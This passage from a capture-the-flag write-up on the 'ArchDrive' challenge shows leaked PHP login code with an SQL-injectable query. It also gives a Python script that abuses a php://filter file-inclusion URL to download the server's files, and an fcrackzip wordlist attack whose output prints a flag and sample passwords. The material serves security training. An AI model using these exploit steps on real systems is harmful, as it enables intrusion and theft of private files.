+</span></span><span class=line><span class=cl>      <span class=nv>$pass</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;pass&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl><span class=nv>$sql</span> <span class=o>=</span> <span class=s2>&#34;SELECT user,password FROM `access-users` WHERE user=&#39;&#34;</span><span class=o>.</span><span class=nv>$user</span><span class=o>.</span><span class=s2>&#34;&#39; AND password=&#39;&#34;</span><span class=o>.</span><span class=nv>$pass</span><span class=o>.</span><span class=s2>&#34;&#39;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>      <span class=nv>$res</span> <span class=o>=</span> <span class=nx>mysqli_query</span><span class=p>(</span><span class=nv>$bdd</span><span class=p>,</span> <span class=nv>$sql</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>      <span class=nv>$num_row</span> <span class=o>=</span> <span class=nx>mysqli_num_rows</span><span class=p>(</span><span class=nv>$res</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>      <span class=nv>$row</span><span class=o>=</span><span class=nx>mysqli_fetch_assoc</span><span class=p>(</span><span class=nv>$res</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=nv>$num_row</span> <span class=o>==</span> <span class=mi>1</span> <span class=o>&amp;&amp;</span> <span class=nv>$user</span> <span class=o>===</span> <span class=nv>$row</span><span class=p>[</span><span class=s1>&#39;user&#39;</span><span class=p>])</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$state</span><span class=o>-&gt;</span><span class=na>return</span> <span class=o>=</span> <span class=s1>&#39;true&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;logged&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=nx>header</span><span class=p>(</span><span class=s2>&#34;Location: myfiles.php&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>      <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>          <span class=nv>$state</span><span class=o>-&gt;</span><span class=na>return</span> <span class=o>=</span> <span class=s1>&#39;false&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>          <span class=nx>header</span><span class=p>(</span><span class=s2>&#34;Location: index.php&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>      <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><p>Great, new file appeared: <strong>myfiles.php</strong></p><blockquote><p><a href="https://archdrive.santhacklaus.xyz/?page=pHp://FilTer/convert.base64-encode/resource=myfiles.php" target=_blank rel="noopener noreffer">https://archdrive.santhacklaus.xyz/?page=pHp://FilTer/convert.base64-encode/resource=myfiles.php</a></p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span><span class=lnt>78
+</span><span class=lnt>79
+</span><span class=lnt>80
+</span><span class=lnt>81
+</span><span class=lnt>82
+</span><span class=lnt>83
+</span><span class=lnt>84
+</span><span class=lnt>85
+</span><span class=lnt>86
+</span><span class=lnt>87
+</span><span class=lnt>88
+</span><span class=lnt>89
+</span><span class=lnt>90
+</span><span class=lnt>91
+</span><span class=lnt>92
+</span><span class=lnt>93
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> <span class=nx>session_start</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;logged&#39;</span><span class=p>]</span> <span class=o>===</span> <span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=cp>?&gt;</span><span class=err>
+</span></span></span><span class=line><span class=cl><span class=err>&lt;!DOCTYPE html&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;html lang=&#34;en&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;head&gt;
+</span></span></span><span class=line><span class=cl><span class=err>  &lt;title&gt;My Files&lt;/title&gt;
+</span></span></span><span class=line><span class=cl><span class=err>  &lt;meta charset=&#34;UTF-8&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>  &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>  &lt;link rel=&#34;icon&#34; type=&#34;image/png&#34; href=&#34;images/icons/favicon.ico&#34;/&gt;
+</span></span></span><span class=line><span class=cl><span class=err>  &lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;vendor/bootstrap/css/bootstrap.min.css&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>  &lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;fonts/font-awesome-4.7.0/css/font-awesome.min.css&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>  &lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;fonts/iconic/css/material-design-iconic-font.min.css&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>  &lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;vendor/animate/animate.css&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>  &lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;vendor/css-hamburgers/hamburgers.min.css&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>  &lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;vendor/animsition/css/animsition.min.css&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>  &lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;vendor/select2/select2.min.css&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>  &lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;vendor/daterangepicker/daterangepicker.css&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>  &lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;css/util.css&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>  &lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;css/main.css&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;/head&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;body&gt;
+</span></span></span><span class=line><span class=cl><span class=err>  &lt;div class=&#34;limiter&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>    &lt;div class=&#34;container-login100&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>      &lt;div class=&#34;wrap-login100&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>          &lt;span class=&#34;login100-form-title p-b-48&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>            &lt;a href=&#34;index.php&#34;&gt;&lt;img class=&#34;logo-brand&#34; src=&#34;images/archdrive-color.png&#34; alt=&#34;ArchDrive logo&#34;&gt;&lt;/a&gt;
+</span></span></span><span class=line><span class=cl><span class=err>          &lt;/span&gt;
+</span></span></span><span class=line><span class=cl><span class=err>          &lt;span class=&#34;login100-form-title p-b-26&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>            ArchDrive
+</span></span></span><span class=line><span class=cl><span class=err>          &lt;/span&gt;
+</span></span></span><span class=line><span class=cl><span class=err>
+</span></span></span><span class=line><span class=cl><span class=err>    &lt;p class=&#34;login100-form-title&#34; style=&#34;font-size: 24px&#34;&gt;My Recent Documents&lt;/p&gt;&lt;/br&gt;
+</span></span></span><span class=line><span class=cl><span class=err>            &lt;ul&gt;
+</span></span></span><span class=line><span class=cl><span class=err>            &lt;li&gt;&lt;a class=&#34;txt2&#34; href=&#34;21f64da1e5792c8295b964d159a14491/rib-bnp.gif&#34;&gt;rib-bnp.gif&lt;/a&gt;&lt;/li&gt;
+</span></span></span><span class=line><span class=cl><span class=err>            &lt;li&gt;&lt;a class=&#34;txt2&#34; href=&#34;21f64da1e5792c8295b964d159a14491/test.html&#34;&gt;test.html&lt;/a&gt;&lt;/li&gt;
+</span></span></span><span class=line><span class=cl><span class=err>            &lt;li&gt;&lt;a class=&#34;txt2&#34; href=&#34;images/vacances1.jpg&#34;&gt;Vacances_2018_1.jpg&lt;/a&gt;&lt;/li&gt;
+</span></span></span><span class=line><span class=cl><span class=err>            &lt;li&gt;&lt;a class=&#34;txt2&#34; href=&#34;21f64da1e5792c8295b964d159a14491/CONFIDENTIEL.zip&#34;&gt;CONFIDENTIEL.zip&lt;/a&gt;&lt;/li&gt;
+</span></span></span><span class=line><span class=cl><span class=err>            &lt;li&gt;&lt;a class=&#34;txt2&#34; href=&#34;21f64da1e5792c8295b964d159a14491/facture_mobile_sfr.png&#34;&gt;facture_mobile_sfr.png&lt;/a&gt;&lt;/li&gt;
+</span></span></span><span class=line><span class=cl><span class=err>            &lt;li&gt;&lt;a class=&#34;txt2&#34; href=&#34;21f64da1e5792c8295b964d159a14491/camel.jpg&#34;&gt;camel.jpg&lt;/a&gt;&lt;/li&gt;
+</span></span></span><span class=line><span class=cl><span class=err>            &lt;li&gt;&lt;a class=&#34;txt2&#34; href=&#34;21f64da1e5792c8295b964d159a14491/cat.jpg&#34;&gt;cat.jpg&lt;/a&gt;&lt;/li&gt;
+</span></span></span><span class=line><span class=cl><span class=err>            &lt;li&gt;&lt;a class=&#34;txt2&#34; href=&#34;21f64da1e5792c8295b964d159a14491/documents&#34;&gt;documents&lt;/a&gt;&lt;/li&gt;
+</span></span></span><span class=line><span class=cl><span class=err>            &lt;li&gt;&lt;a class=&#34;txt2&#34; href=&#34;21f64da1e5792c8295b964d159a14491/funny_wtf.jpg&#34;&gt;funny_wtf.jpg&lt;/a&gt;&lt;/li&gt;
+</span></span></span><span class=line><span class=cl><span class=err>            &lt;li&gt;&lt;a class=&#34;txt2&#34; href=&#34;21f64da1e5792c8295b964d159a14491/freshandhappy.mp3&#34;&gt;freshandhappy.mp3&lt;/a&gt;&lt;/li&gt;
+</span></span></span><span class=line><span class=cl><span class=err>            &lt;li&gt;&lt;a class=&#34;txt2&#34; href=&#34;21f64da1e5792c8295b964d159a14491/intense.mp3&#34;&gt;intense.mp3&lt;/a&gt;&lt;/li&gt;
+</span></span></span><span class=line><span class=cl><span class=err>            &lt;li&gt;&lt;a class=&#34;txt2&#34; href=&#34;21f64da1e5792c8295b964d159a14491/recup.zip&#34;&gt;recup.zip&lt;/a&gt;&lt;/li&gt;
+</span></span></span><span class=line><span class=cl><span class=err>            &lt;li&gt;&lt;a class=&#34;txt2&#34; href=&#34;21f64da1e5792c8295b964d159a14491/funny.jpg&#34;&gt;funny.jpg&lt;/a&gt;&lt;/li&gt;
+</span></span></span><span class=line><span class=cl><span class=err>            &lt;li&gt;&lt;a class=&#34;txt2&#34; href=&#34;21f64da1e5792c8295b964d159a14491/goats.jpg&#34;&gt;goats.jpg&lt;/a&gt;&lt;/li&gt;
+</span></span></span><span class=line><span class=cl><span class=err>            &lt;li&gt;&lt;a class=&#34;txt2&#34; href=&#34;21f64da1e5792c8295b964d159a14491/lol.jpg&#34;&gt;lol.jpg&lt;/a&gt;&lt;/li&gt;
+</span></span></span><span class=line><span class=cl><span class=err>            &lt;li&gt;&lt;a class=&#34;txt2&#34; href=&#34;21f64da1e5792c8295b964d159a14491/rapport_SM.pdf&#34;&gt;rapport_SM.pdf&lt;/a&gt;&lt;/li&gt;
+</span></span></span><span class=line><span class=cl><span class=err>            &lt;li&gt;&lt;a class=&#34;txt2&#34; href=&#34;21f64da1e5792c8295b964d159a14491/media&#34;&gt;media&lt;/a&gt;&lt;/li&gt;
+</span></span></span><span class=line><span class=cl><span class=err>            &lt;li&gt;&lt;a class=&#34;txt2&#34; href=&#34;21f64da1e5792c8295b964d159a14491/these.pdf&#34;&gt;these.pdf&lt;/a&gt;&lt;/li&gt;
+</span></span></span><span class=line><span class=cl><span class=err>            &lt;li&gt;&lt;a class=&#34;txt2&#34; href=&#34;21f64da1e5792c8295b964d159a14491/these-2.pdf&#34;&gt;these-2.pdf&lt;/a&gt;&lt;/li&gt;
+</span></span></span><span class=line><span class=cl><span class=err>            &lt;li&gt;&lt;a class=&#34;txt2&#34; href=&#34;21f64da1e5792c8295b964d159a14491/wallpaper.jpg&#34;&gt;wallpaper.jpg&lt;/a&gt;&lt;/li&gt;
+</span></span></span><span class=line><span class=cl><span class=err>            &lt;li&gt;&lt;a class=&#34;txt2&#34; href=&#34;21f64da1e5792c8295b964d159a14491/VeraCrypt.zip&#34;&gt;VeraCrypt.zip&lt;/a&gt;&lt;/li&gt;
+</span></span></span><span class=line><span class=cl><span class=err>            &lt;/ul&gt;
+</span></span></span><span class=line><span class=cl><span class=err>
+</span></span></span><span class=line><span class=cl><span class=err>&lt;div class=&#34;text-center p-t-115&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;form method=&#34;post&#34; action=&#34;logout.php&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;button class=&#34;txt2&#34; value=&#34;disconnect&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>Log out.
+</span></span></span><span class=line><span class=cl><span class=err>&lt;/button&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;/form&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;/div&gt;
+</span></span></span><span class=line><span class=cl><span class=err>
+</span></span></span><span class=line><span class=cl><span class=err>      &lt;/div&gt;
+</span></span></span><span class=line><span class=cl><span class=err>    &lt;/div&gt;
+</span></span></span><span class=line><span class=cl><span class=err>  &lt;/div&gt;
+</span></span></span><span class=line><span class=cl><span class=err>
+</span></span></span><span class=line><span class=cl><span class=err>
+</span></span></span><span class=line><span class=cl><span class=err>  &lt;div id=&#34;dropDownSelect1&#34;&gt;&lt;/div&gt;
+</span></span></span><span class=line><span class=cl><span class=err>
+</span></span></span><span class=line><span class=cl><span class=err>  &lt;script src=&#34;vendor/jquery/jquery-3.2.1.min.js&#34;&gt;&lt;/script&gt;
+</span></span></span><span class=line><span class=cl><span class=err>  &lt;script src=&#34;vendor/animsition/js/animsition.min.js&#34;&gt;&lt;/script&gt;
+</span></span></span><span class=line><span class=cl><span class=err>  &lt;script src=&#34;vendor/bootstrap/js/popper.js&#34;&gt;&lt;/script&gt;
+</span></span></span><span class=line><span class=cl><span class=err>  &lt;script src=&#34;vendor/bootstrap/js/bootstrap.min.js&#34;&gt;&lt;/script&gt;
+</span></span></span><span class=line><span class=cl><span class=err>  &lt;script src=&#34;vendor/select2/select2.min.js&#34;&gt;&lt;/script&gt;
+</span></span></span><span class=line><span class=cl><span class=err>  &lt;script src=&#34;vendor/daterangepicker/moment.min.js&#34;&gt;&lt;/script&gt;
+</span></span></span><span class=line><span class=cl><span class=err>  &lt;script src=&#34;vendor/daterangepicker/daterangepicker.js&#34;&gt;&lt;/script&gt;
+</span></span></span><span class=line><span class=cl><span class=err>  &lt;script src=&#34;vendor/countdowntime/countdowntime.js&#34;&gt;&lt;/script&gt;
+</span></span></span><span class=line><span class=cl><span class=err>  &lt;script src=&#34;js/main.js&#34;&gt;&lt;/script&gt;
+</span></span></span><span class=line><span class=cl><span class=err>
+</span></span></span><span class=line><span class=cl><span class=err>&lt;/body&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;/html&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;?php
+</span></span></span><span class=line><span class=cl><span class=err>    }
+</span></span></span><span class=line><span class=cl><span class=err>    else
+</span></span></span><span class=line><span class=cl><span class=err>    {
+</span></span></span><span class=line><span class=cl><span class=err>        include(&#39;error.php&#39;);
+</span></span></span><span class=line><span class=cl><span class=err>    }
+</span></span></span><span class=line><span class=cl><span class=err>?&gt;
+</span></span></span></code></pre></td></tr></table></div></div><h3 id=file-extraction>File extraction</h3><p>Ok, now I think I&rsquo;m seeing files stored in the drive, I made a little script to extract them:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/python2</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>file_list</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;21f64da1e5792c8295b964d159a14491/rib-bnp.gif&#39;</span><span class=p>,</span> <span class=s1>&#39;21f64da1e5792c8295b964d159a14491/test.html&#39;</span><span class=p>,</span> <span class=s1>&#39;images/vacances1.jpg&#39;</span><span class=p>,</span> <span class=s1>&#39;21f64da1e5792c8295b964d159a14491/CONFIDENTIEL.zip&#39;</span><span class=p>,</span> <span class=s1>&#39;21f64da1e5792c8295b964d159a14491/facture_mobile_sfr.png&#39;</span><span class=p>,</span> <span class=s1>&#39;21f64da1e5792c8295b964d159a14491/camel.jpg&#39;</span><span class=p>,</span> <span class=s1>&#39;21f64da1e5792c8295b964d159a14491/cat.jpg&#39;</span><span class=p>,</span> <span class=s1>&#39;21f64da1e5792c8295b964d159a14491/funny_wtf.jpg&#39;</span><span class=p>,</span> <span class=s1>&#39;21f64da1e5792c8295b964d159a14491/freshandhappy.mp3&#39;</span><span class=p>,</span> <span class=s1>&#39;21f64da1e5792c8295b964d159a14491/intense.mp3&#39;</span><span class=p>,</span> <span class=s1>&#39;21f64da1e5792c8295b964d159a14491/recup.zip&#39;</span><span class=p>,</span> <span class=s1>&#39;21f64da1e5792c8295b964d159a14491/funny.jpg&#39;</span><span class=p>,</span> <span class=s1>&#39;21f64da1e5792c8295b964d159a14491/goats.jpg&#39;</span><span class=p>,</span> <span class=s1>&#39;21f64da1e5792c8295b964d159a14491/lol.jpg&#39;</span><span class=p>,</span> <span class=s1>&#39;21f64da1e5792c8295b964d159a14491/rapport_SM.pdf&#39;</span><span class=p>,</span> <span class=s1>&#39;21f64da1e5792c8295b964d159a14491/these.pdf&#39;</span><span class=p>,</span> <span class=s1>&#39;21f64da1e5792c8295b964d159a14491/these-2.pdf&#39;</span><span class=p>,</span> <span class=s1>&#39;21f64da1e5792c8295b964d159a14491/wallpaper.jpg&#39;</span><span class=p>,</span> <span class=s1>&#39;21f64da1e5792c8295b964d159a14491/VeraCrypt.zip&#39;</span><span class=p>,</span><span class=s1>&#39;21f64da1e5792c8295b964d159a14491/media&#39;</span><span class=p>,</span><span class=s1>&#39;21f64da1e5792c8295b964d159a14491/documents&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>file_list</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>  <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;https://archdrive.santhacklaus.xyz/index.php?page=pHp://FilTer/convert.base64-encode/resource=&#34;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>  <span class=n>data</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\r\n</span><span class=s1>&#39;</span><span class=p>)[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=n>filename</span> <span class=o>=</span> <span class=n>i</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>,</span><span class=s1>&#39;_&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>  <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] Result written in: </span><span class=si>{0}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>filename</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>  <span class=n>f</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span> <span class=s1>&#39;wb&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>  <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>  <span class=n>f</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p>The <strong>CONFIDENTIEL.zip</strong> contains garbage, nothing usefull. But the <strong>recup.zip</strong> is encrypted!</p><h3 id=bruteforce-time>Bruteforce time</h3><p>I got an encrypted zip file, I got a wordlist, let&rsquo;s call fcrackzip:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ fcrackzip -v -D -u -p /home/maki/Tools/wordlist/rockyou.txt 21f64da1e5792c8295b964d159a14491_recup.zip
+</span></span><span class=line><span class=cl>found file <span class=s1>&#39;password.txt&#39;</span>, <span class=o>(</span>size cp/uc    271/   377, flags 9, chk 5aec<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>PASSWORD FOUND!!!!: <span class=nv>pw</span> <span class=o>==</span> hackerman
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ unzip 21f64da1e5792c8295b964d159a14491_recup.zip
+</span></span><span class=line><span class=cl>Archive:  21f64da1e5792c8295b964d159a14491_recup.zip
+</span></span><span class=line><span class=cl><span class=o>[</span>21f64da1e5792c8295b964d159a14491_recup.zip<span class=o>]</span> password.txt password: hackerman
+</span></span><span class=line><span class=cl>  inflating: password.txt
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ cat password.txt
+</span></span><span class=line><span class=cl><span class=o>===</span> <span class=nv>FLAG</span> <span class=o>===</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>IMTLD<span class=o>{</span>F1nd_Y0uR_W4y<span class=o>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>====</span> <span class=nv>Facebook</span> <span class=o>===</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>P@ssw0rd123
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>===</span> <span class=nv>Twitter</span> <span class=o>===</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>azertY#!?$
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>===</span> <span class=nv>Job</span> <span class=o>===</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Door: <span class=m>5846</span>
+</span></span><span class=line><span class=cl>Computer: 0112#aqzsed
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>===</span> <span class=nv>zip</span> <span class=o>===</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>ohm0-9Quirk
+</span></span><span class=line><span class=cl>Finny5-polo2-Rule
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>===</span> <span class=nv>VC</span> <span class=o>===</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>7Rex-Mazda0-hover1-Quid
+</span></span><span class=line><span class=cl>Gourd-crown2-gao4-warp2 - Take On Me
+</span></span><span class=line><span class=cl>0twain-Mao0-flash-6Goof-Gent
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>===</span> <span class=nv>Portable</span> <span class=o>===</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>Windobe123</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>===</span> <span class=nv>iPhone</span> <span class=o>===</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=m>123789</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=flag-1>Flag</h3><blockquote><p>IMTLD{F1nd_Y0uR_W4y}</p></blockquote><h2 id=archdrive-33>ArchDrive 3/3</h2><h3 id=statement-2>Statement</h3><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2018_santhacklaus/archdrive/statement_archdrive3.png data-srcset="/lib/images/writeups/2018_santhacklaus/archdrive/statement_archdrive3.png, /lib/images/writeups/2018_santhacklaus/archdrive/statement_archdrive3.png 1.5x, /lib/images/writeups/2018_santhacklaus/archdrive/statement_archdrive3.png 2x" data-sizes=auto alt=/lib/images/writeups/2018_santhacklaus/archdrive/statement_archdrive3.png title=/lib/images/writeups/2018_santhacklaus/archdrive/statement_archdrive3.png></p><h3 id=state-of-the-art-2>State of the art</h3><p>According to the previous part, here is what we got:</p><ul><li>There is something to do with Veracrypt</li><li>Veracrypt container hasn&rsquo;t got magic number (documents and media could be containers)</li><li>password.txt contains <strong>VC password</strong> (VC -> 